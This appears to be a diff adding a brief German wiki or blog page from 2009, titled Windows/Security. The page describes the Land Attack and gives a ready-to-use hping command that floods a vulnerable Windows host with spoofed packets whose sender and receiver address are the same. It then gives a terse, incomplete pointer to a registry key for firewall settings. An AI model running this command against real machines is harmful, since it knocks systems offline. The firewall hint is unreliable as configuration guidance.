@@ -1,0 +1,26 @@
+
+title: Windows/Security
+author: abma
+date: 21-11-2009
+
+{% extends "post.html" %}
+{% block body %}
+
+{% load markup %}
+{% filter markdown %}
+
+<h2>Land Attack</h2>
+Dabei wird ein Paket mit Absender=Emfp&#228;nger IP an den Verwundbaren Rechner geschickt. z.B. mit<br/>
+ hping -V -c 100 -d 40 -S -k -s 139 -p 139 -a 192.168.0.1 192.168.0.1<br/>
+
+<br/>
+<h2>Firewall per Registry einstellen</h2>
+<br/>
+Einfach diesen schl&#252;ssel kopieren:<br/>
+
+ Hkey_Local_Machine\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy.<br/>
+
+<a href="/">Kategorie:Windows</a>
+
+{% endfilter %}
+{% endblock %}
